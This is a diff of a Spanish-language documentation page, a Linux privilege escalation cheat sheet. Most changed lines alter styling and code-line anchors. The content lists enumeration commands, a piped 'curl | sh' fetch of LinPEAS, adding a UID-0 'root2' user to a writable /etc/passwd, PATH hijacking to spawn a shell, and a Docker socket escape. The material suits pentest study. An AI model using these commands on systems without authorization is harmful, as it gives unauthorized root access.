@@ -46,8 +46,8 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
       
     
     
@@ -67,7 +67,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="grey">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -1112,77 +1112,77 @@
 <h1 id="linux-privilege-escalation">Linux Privilege Escalation<a class="headerlink" href="#linux-privilege-escalation" title="Permanent link">&para;</a></h1>
 <h2 id="enumeracion-inicial">Enumeración Inicial<a class="headerlink" href="#enumeracion-inicial" title="Permanent link">&para;</a></h2>
 <h3 id="sistema">Sistema<a class="headerlink" href="#sistema" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Info del sistema</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>uname<span class="w"> </span>-a
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>cat<span class="w"> </span>/etc/os-release
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>hostname
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># Usuarios</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>id
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>whoami
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>nologin
+<div class="highlight"><pre><span></span><code><span class="c1"># Info del sistema</span>
+uname<span class="w"> </span>-a
+cat<span class="w"> </span>/etc/os-release
+hostname
+
+<span class="c1"># Usuarios</span>
+id
+whoami
+cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>nologin
 </code></pre></div>
 <h3 id="herramientas-automaticas">Herramientas Automáticas<a class="headerlink" href="#herramientas-automaticas" title="Permanent link">&para;</a></h3>
 <div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">LinPEAS</label><label for="__tabbed_1_2">LinEnum</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>-L<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-L<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh
 </code></pre></div>
 </div>
 <div class="tabbed-block">
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>LinEnum.sh<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./LinEnum.sh
+<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod<span class="w"> </span>+x<span class="w"> </span>LinEnum.sh<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./LinEnum.sh
 </code></pre></div>
 </div>
 </div>
 </div>
 <h2 id="vectores-de-escalada">Vectores de Escalada<a class="headerlink" href="#vectores-de-escalada" title="Permanent link">&para;</a></h2>
 <h3 id="suidsgid">SUID/SGID<a class="headerlink" href="#suidsgid" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Buscar binarios SUID</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Buscar binarios SGID</span>
-<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
-<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Buscar capabilities</span>
-<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<div class="highlight"><pre><span></span><code><span class="c1"># Buscar binarios SUID</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Buscar binarios SGID</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Buscar capabilities</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 </code></pre></div>
 <div class="admonition tip">
 <p class="admonition-title">GTFOBins</p>
 <p>Consulta <a href="https://gtfobins.github.io/">GTFOBins</a> para explotar binarios SUID</p>
 </div>
 <h3 id="sudo">Sudo<a class="headerlink" href="#sudo" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Permisos sudo</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sudo<span class="w"> </span>-l
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Versión de sudo (CVE-2021-4034, etc)</span>
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>sudo<span class="w"> </span>--version
+<div class="highlight"><pre><span></span><code><span class="c1"># Permisos sudo</span>
+sudo<span class="w"> </span>-l
+
+<span class="c1"># Versión de sudo (CVE-2021-4034, etc)</span>
+sudo<span class="w"> </span>--version
 </code></pre></div>
 <h3 id="cron-jobs">Cron Jobs<a class="headerlink" href="#cron-jobs" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Listar cron jobs</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>cat<span class="w"> </span>/etc/crontab
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>crontab<span class="w"> </span>-l
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># Monitorear procesos</span>
-<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># Usando pspy</span>
-<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>./pspy64
+<div class="highlight"><pre><span></span><code><span class="c1"># Listar cron jobs</span>
+cat<span class="w"> </span>/etc/crontab
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+crontab<span class="w"> </span>-l
+
+<span class="c1"># Monitorear procesos</span>
+<span class="c1"># Usando pspy</span>
+./pspy64
 </code></pre></div>
 <h3 id="archivos-con-permisos-debiles">Archivos con Permisos Débiles<a class="headerlink" href="#archivos-con-permisos-debiles" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Archivos escribibles</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># /etc/passwd escribible</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/passwd
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># Si es escribible:</span>
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;root2:$(openssl passwd password):0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+<div class="highlight"><pre><span></span><code><span class="c1"># Archivos escribibles</span>
+find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># /etc/passwd escribible</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/passwd
+<span class="c1"># Si es escribible:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;root2:$(openssl passwd password):0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
 </code></pre></div>
 <h3 id="kernel-exploits">Kernel Exploits<a class="headerlink" href="#kernel-exploits" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Versión del kernel</span>
-<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>uname<span class="w"> </span>-r
-<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
-<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Buscar exploits</span>
-<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>searchsploit<span class="w"> </span>linux<span class="w"> </span>kernel<span class="w"> </span><span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># Versión del kernel</span>
+uname<span class="w"> </span>-r
+
+<span class="c1"># Buscar exploits</span>
+searchsploit<span class="w"> </span>linux<span class="w"> </span>kernel<span class="w"> </span><span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>
 </code></pre></div>
 <div class="admonition danger">
 <p class="admonition-title">Último recurso</p>
@@ -1190,23 +1190,23 @@
 </div>
 <h2 id="tecnicas-comunes">Técnicas Comunes<a class="headerlink" href="#tecnicas-comunes" title="Permanent link">&para;</a></h2>
 <h3 id="path-hijacking">Path Hijacking<a class="headerlink" href="#path-hijacking" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Si un binario SUID ejecuta comandos sin ruta absoluta</span>
-<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/bash&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/comando
-<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/comando
-<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
-<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>./binario_vulnerable
+<div class="highlight"><pre><span></span><code><span class="c1"># Si un binario SUID ejecuta comandos sin ruta absoluta</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/bash&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/comando
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/comando
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+./binario_vulnerable
 </code></pre></div>
 <h3 id="library-hijacking">Library Hijacking<a class="headerlink" href="#library-hijacking" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Buscar librerías faltantes</span>
-<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>ldd<span class="w"> </span>/path/to/binary
-<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>strace<span class="w"> </span>/path/to/binary<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;open.*\.so&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="c1"># Buscar librerías faltantes</span>
+ldd<span class="w"> </span>/path/to/binary
+strace<span class="w"> </span>/path/to/binary<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;open.*\.so&quot;</span>
 </code></pre></div>
 <h3 id="docker-escape">Docker Escape<a class="headerlink" href="#docker-escape" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Verificar si estamos en Docker</span>
-<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>cat<span class="w"> </span>/proc/1/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>docker
-<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
-<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># Si el socket está montado</span>
-<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt<span class="w"> </span>sh
+<div class="highlight"><pre><span></span><code><span class="c1"># Verificar si estamos en Docker</span>
+cat<span class="w"> </span>/proc/1/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>docker
+
+<span class="c1"># Si el socket está montado</span>
+docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt<span class="w"> </span>sh
 </code></pre></div>
 
 
@@ -1257,7 +1257,7 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
